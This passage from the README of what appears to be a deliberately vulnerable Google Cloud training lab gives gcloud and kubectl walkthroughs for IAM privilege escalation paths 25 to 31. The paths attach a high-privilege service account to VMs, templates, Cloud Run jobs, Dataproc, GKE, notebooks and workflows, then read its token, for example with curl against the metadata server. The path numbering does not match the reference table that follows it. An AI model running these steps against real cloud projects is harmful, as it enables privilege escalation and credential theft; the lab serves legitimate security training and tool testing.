  --audiences="https://your-cloud-run-service.run.app")

curl -H "Authorization: Bearer $TOKEN" https://your-cloud-run-service.run.app
```

---

### Path 25: setServiceAccount on Compute

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc25-set-sa@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `compute.instances.setServiceAccount` + `actAs` |
| **Target** | Existing VM |
| **Impact** | Change VM's SA to high-priv SA |
| **Requires** | `enable_compute = true` module |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc25-set-sa@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Stop the target instance
gcloud compute instances stop privesc-instance --zone=us-central1-a

# Step 3: Change the service account
gcloud compute instances set-service-account privesc-instance \
  --zone=us-central1-a \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --scopes=cloud-platform

# Step 4: Start the instance
gcloud compute instances start privesc-instance --zone=us-central1-a

# Step 5: SSH and grab the new SA token
gcloud compute ssh privesc-instance --zone=us-central1-a
```

---

### Path 26: Instance Templates

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc26-inst-templates@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `compute.instanceTemplates.create` + `actAs` |
| **Target** | Create template with high-priv SA |
| **Impact** | Persistent access via instance template |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc26-inst-templates@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create an instance template with high-priv SA
gcloud compute instance-templates create evil-template \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --scopes=cloud-platform \
  --machine-type=e2-micro

# Step 3: Create an instance from the template
gcloud compute instances create evil-vm \
  --source-instance-template=evil-template \
  --zone=us-central1-a

# Step 4: SSH and get the token
gcloud compute ssh evil-vm --zone=us-central1-a
```

---

### Path 27: Cloud Run Jobs

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc27-run-jobs@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `run.jobs.create` + `actAs` |
| **Target** | Cloud Run job with high-priv SA |
| **Impact** | Execute containers as high-priv SA |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc27-run-jobs@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a Cloud Run job
gcloud run jobs create evil-job \
  --image=gcr.io/cloudrun/hello \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --region=us-central1

# Step 3: Execute the job
gcloud run jobs execute evil-job --region=us-central1

# Cleanup
gcloud run jobs delete evil-job --region=us-central1 --quiet
```

---

### Path 28: Dataproc Clusters

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc28-dataproc@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `dataproc.clusters.create` + `actAs` |
| **Target** | Dataproc cluster with high-priv SA |
| **Impact** | SSH to cluster nodes, steal SA token |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc28-dataproc@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a Dataproc cluster (costs ~$0.10/hr)
gcloud dataproc clusters create evil-cluster \
  --region=us-central1 \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --single-node

# Step 3: SSH to the master node
gcloud compute ssh evil-cluster-m --zone=us-central1-a

# Step 4: Get the SA token from metadata
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Cleanup
gcloud dataproc clusters delete evil-cluster --region=us-central1 --quiet
```

---

### Path 29: GKE Cluster

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc29-gke-cluster@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `container.clusters.create` + `actAs` |
| **Target** | GKE cluster with high-priv node SA |
| **Impact** | Access SA via Kubernetes pods |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc29-gke-cluster@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a GKE cluster (costs ~$70/mo minimum)
gcloud container clusters create evil-cluster \
  --zone=us-central1-a \
  --num-nodes=1 \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: Get credentials
gcloud container clusters get-credentials evil-cluster --zone=us-central1-a

# Step 4: Deploy a pod to access node SA
kubectl run evil-pod --image=google/cloud-sdk:slim --command -- sleep infinity
kubectl exec -it evil-pod -- gcloud auth print-access-token

# Cleanup
gcloud container clusters delete evil-cluster --zone=us-central1-a --quiet
```

---

### Path 30: Vertex AI Notebooks

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc30-notebooks@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `notebooks.instances.create` + `actAs` |
| **Target** | Notebook instance with high-priv SA |
| **Impact** | Interactive shell as high-priv SA |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc30-notebooks@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a notebook instance (costs ~$25/mo)
gcloud notebooks instances create evil-notebook \
  --location=us-central1-a \
  --vm-image-project=deeplearning-platform-release \
  --vm-image-family=tf-latest-cpu \
  --machine-type=n1-standard-1 \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com

# Step 3: Access via JupyterLab and run code to get tokens

# Cleanup
gcloud notebooks instances delete evil-notebook --location=us-central1-a --quiet
```

---

### Path 31: Cloud Workflows

| Property | Value |
|----------|-------|
| **Starting SA** | `privesc31-workflows@PROJECT_ID.iam.gserviceaccount.com` |
| **Vulnerable Permission** | `workflows.workflows.create` + `actAs` |
| **Target** | Workflow with high-priv SA |
| **Impact** | Execute API calls as high-priv SA |

```bash
# Step 1: Impersonate the vulnerable SA
gcloud config set auth/impersonate_service_account \
  privesc31-workflows@$PROJECT_ID.iam.gserviceaccount.com

# Step 2: Create a workflow definition
cat > /tmp/workflow.yaml << 'EOF'
main:
  steps:
    - get_project:
        call: http.get
        args:
          url: https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID
          auth:
            type: OAuth2
        result: project_info
    - return_result:
        return: ${project_info.body}
EOF

# Step 3: Deploy the workflow
gcloud workflows deploy evil-workflow \
  --source=/tmp/workflow.yaml \
  --service-account=privesc-high-priv-sa@$PROJECT_ID.iam.gserviceaccount.com \
  --location=us-central1

# Step 4: Execute the workflow
gcloud workflows run evil-workflow --location=us-central1

# Cleanup
gcloud workflows delete evil-workflow --location=us-central1 --quiet
```

---

## Quick Reference: All Service Accounts

| Path | Service Account Email |
|------|----------------------|
| Target (high-priv) | `privesc-high-priv-sa@PROJECT_ID.iam.gserviceaccount.com` |
| **IAM Service Account** | |
| 1 | `privesc1-set-iam-policy@PROJECT_ID.iam.gserviceaccount.com` |
| 2 | `privesc2-create-key@PROJECT_ID.iam.gserviceaccount.com` |
| 3 | `privesc3-set-sa-iam@PROJECT_ID.iam.gserviceaccount.com` |
| 4 | `privesc4-get-access-token@PROJECT_ID.iam.gserviceaccount.com` |
| 5 | `privesc5-sign-blob@PROJECT_ID.iam.gserviceaccount.com` |
| 6 | `privesc6-sign-jwt@PROJECT_ID.iam.gserviceaccount.com` |
| 7 | `privesc7-implicit-delegation@PROJECT_ID.iam.gserviceaccount.com` |
| 8 | `privesc8-get-oidc-token@PROJECT_ID.iam.gserviceaccount.com` |
| 9 | `privesc9-update-role@PROJECT_ID.iam.gserviceaccount.com` |
| **Compute Engine** | |
| 10 | `privesc10-actas-compute@PROJECT_ID.iam.gserviceaccount.com` |
| 11 | `privesc11-set-metadata@PROJECT_ID.iam.gserviceaccount.com` |
| 12 | `privesc12-os-login@PROJECT_ID.iam.gserviceaccount.com` |
| 13 | `privesc13-set-sa@PROJECT_ID.iam.gserviceaccount.com` |
| 14 | `privesc14-inst-templates@PROJECT_ID.iam.gserviceaccount.com` |
| **Cloud Functions** | |
| 15 | `privesc15-actas-function@PROJECT_ID.iam.gserviceaccount.com` |
| 16 | `privesc16-update-function@PROJECT_ID.iam.gserviceaccount.com` |
| 17 | `privesc17-sourcecode-set@PROJECT_ID.iam.gserviceaccount.com` |
| **Cloud Run** | |
| 18 | `privesc18-actas-cloudrun@PROJECT_ID.iam.gserviceaccount.com` |
| 19 | `privesc19-run-update@PROJECT_ID.iam.gserviceaccount.com` |
| 20 | `privesc20-run-jobs@PROJECT_ID.iam.gserviceaccount.com` |
| **Cloud Build** | |
| 21 | `privesc21-actas-cloudbuild@PROJECT_ID.iam.gserviceaccount.com` |
| 22 | `privesc22-build-triggers@PROJECT_ID.iam.gserviceaccount.com` |
| **Storage** | |
| 23 | `privesc23-bucket-iam@PROJECT_ID.iam.gserviceaccount.com` |
| 24 | `privesc24-storage-write@PROJECT_ID.iam.gserviceaccount.com` |
| **Secret Manager** | |
| 25 | `privesc25-secret-access@PROJECT_ID.iam.gserviceaccount.com` |
| 26 | `privesc26-secret-setiam@PROJECT_ID.iam.gserviceaccount.com` |
| **Pub/Sub** | |
| 27 | `privesc27-pubsub-iam@PROJECT_ID.iam.gserviceaccount.com` |
| **Cloud Scheduler** | |
| 28 | `privesc28-scheduler@PROJECT_ID.iam.gserviceaccount.com` |
| **Deployment Manager** | |
| 29 | `privesc29-deployment-mgr@PROJECT_ID.iam.gserviceaccount.com` |
| **Composer** | |
| 30 | `privesc30-composer@PROJECT_ID.iam.gserviceaccount.com` |
| **Dataflow** | |
| 31 | `privesc31-dataflow@PROJECT_ID.iam.gserviceaccount.com` |
| **Dataproc** | |
| 32 | `privesc32-dataproc@PROJECT_ID.iam.gserviceaccount.com` |
| 33 | `privesc33-dataproc-jobs@PROJECT_ID.iam.gserviceaccount.com` |
| **GKE/Kubernetes** | |
| 34 | `privesc34-gke@PROJECT_ID.iam.gserviceaccount.com` |
| 35 | `privesc35-gke-creds@PROJECT_ID.iam.gserviceaccount.com` |
| **Vertex AI** | |
| 36 | `privesc36-notebooks@PROJECT_ID.iam.gserviceaccount.com` |
| 37 | `privesc37-aiplatform@PROJECT_ID.iam.gserviceaccount.com` |
| **Cloud Workflows** | |
| 38 | `privesc38-workflows@PROJECT_ID.iam.gserviceaccount.com` |
| **Eventarc** | |
| 39 | `privesc39-eventarc@PROJECT_ID.iam.gserviceaccount.com` |
| **BigQuery** | |
| 40 | `privesc40-bq-setiam@PROJECT_ID.iam.gserviceaccount.com` |
| **Workload Identity** | |
| 41 | `privesc41-workload-id@PROJECT_ID.iam.gserviceaccount.com` |
| **Org Policy** | |
| 42 | `privesc42-org-policy@PROJECT_ID.iam.gserviceaccount.com` |
| **Deny Bypass** | |
| 43 | `privesc43-deny-bypass@PROJECT_ID.iam.gserviceaccount.com` |

## Architecture

```
gcp/
├── main.tf                    # Root configuration
├── variables.tf               # Input variables
├── outputs.tf                 # Output values
├── terraform.tfvars.example   # Example configuration
├── cleanup-scripts/           # Manual cleanup tools
│   ├── CLEANUP_README.md
│   ├── cleanup_iam_vulnerable.sh
│   └── cleanup_iam_vulnerable.py
└── modules/
    ├── free-resources/
    │   ├── privesc-paths/     # 43 privilege escalation paths
    │   │   ├── common.tf      # Shared resources
    │   │   ├── privesc1-*.tf  # Individual paths
    │   │   └── ...
    │   └── tool-testing/      # FN/FP test cases
    └── non-free-resources/
        ├── compute/           # GCE instance
        ├── cloud-functions/   # Cloud Functions
        └── cloud-run/         # Cloud Run service
```

## References

- [Privilege Escalation in GCP](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
- [GCP IAM Roles](https://cloud.google.com/iam/docs/understanding-roles)
- [Service Account Impersonation](https://cloud.google.com/iam/docs/impersonating-service-accounts)
- [FoxMapper Documentation](https://github.com/BishopFox/foxmapper)
